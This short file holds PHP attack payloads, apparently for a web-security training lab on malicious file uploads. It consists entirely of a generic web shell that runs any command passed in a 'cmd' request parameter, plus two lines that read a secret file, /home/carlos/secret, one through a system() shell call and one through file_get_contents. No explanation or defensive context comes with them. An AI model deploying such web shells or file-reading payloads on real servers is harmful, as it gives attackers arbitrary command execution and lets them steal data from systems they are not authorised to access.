<!-- <?php system("cat /home/carlos/secret"); ?>
<?php echo system($_REQUEST['cmd']); ?> -->
<?php echo file_get_contents('/home/carlos/secret'); ?>